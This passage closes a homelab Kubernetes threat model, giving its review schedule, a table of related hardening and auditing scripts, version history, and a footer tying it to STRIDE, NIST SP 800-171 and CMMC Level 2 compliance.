Rocky Linux 9.7's RHEL binary compatibility is directly relevant to GovCloud contexts where RHEL STIG AMIs are the approved baseline; operational experience with Rocky 9 hardening translates directly to RHEL 9 STIG implementation.

---

## 13. Review and Maintenance

### 13.1 Review Schedule

| Trigger | Action |
|---|---|
| **Quarterly** | Full review of all CRITICAL and HIGH findings; confirm mitigations remain effective; update threat matrix |
| **New component added** | Extend threat model for new component; re-evaluate all cross-cutting threats |
| **Security incident** | Post-incident review; add new threats identified during investigation; update residual risk register |
| **Major version upgrade** | Review CVE database for new threats to upgraded components |
| **AWS configuration change** | Verify Security Group rules, IAM policies, and CloudTrail remain aligned with this document |
| **Personnel change** | Review all credential and access grants; run FreeIPA account auditor; rotate shared credentials; revoke AWS IAM users |
| **Annual** | Full document review; validate all NIST control mappings against current configuration; GovCloud gap assessment |

### 13.2 Related Documents and Scripts

| Document / Script | Path | Description |
|---|---|---|
| Build Checklist | `docs/homelab-build-checklist.md` | Phased implementation checklist |
| AIDE Log Parser | `scripts/aide_to_splunk.py` | FIM event ingestion → Splunk HEC |
| K8s Secret Auditor | `scripts/k8s_secret_auditor.py` | Audit log anomaly detection |
| FreeIPA Account Auditor | `scripts/freeipa_account_auditor.py` | Stale account detection with NIST mapping |
| Terraform Configs | `terraform/` | VPC, EC2, Security Group, IAM definitions |
| Ansible Hardening | `ansible/` | OS hardening playbooks for Rocky Linux 9.7 |
| Network Diagrams | `docs/homelab-network-diagrams.html` | AWS VPC topology + security zone overlays |
| Workflow Diagrams | `docs/homelab-workflow-diagrams.html` | GitOps, CI/CD, and automation flow diagrams |

### 13.3 Document Control

| Version | Date | Author | Changes |
|---|---|---|---|
| 1.0 | 2026-03-02 | Jason A. Slocomb | Initial release — Proxmox-based homelab (TM-K8S-001) |
| 2.0 | 2026-04-02 | Jason A. Slocomb | Full rewrite for AWS migration — added AWS infrastructure layer (6.15), bastion threat model (6.16), NetBox (6.12), Falco (9.12), IMDS threats (T-15.2), Security Group threats (T-15.1), CloudTrail coverage (I-15.1), GovCloud gap analysis (Section 12); updated topology, trust levels, and residual risk register |

---

*This document was produced as part of the AWS-hosted homelab Kubernetes security engineering portfolio demonstrating CMMC Level 2 compliance architecture and threat modeling capability. It follows the STRIDE threat modeling methodology and maps findings to NIST SP 800-171 Rev 2 security requirements. The architecture is designed for direct transferability to AWS GovCloud IL2/IL4 contexts relevant to DoD contractor environments.*
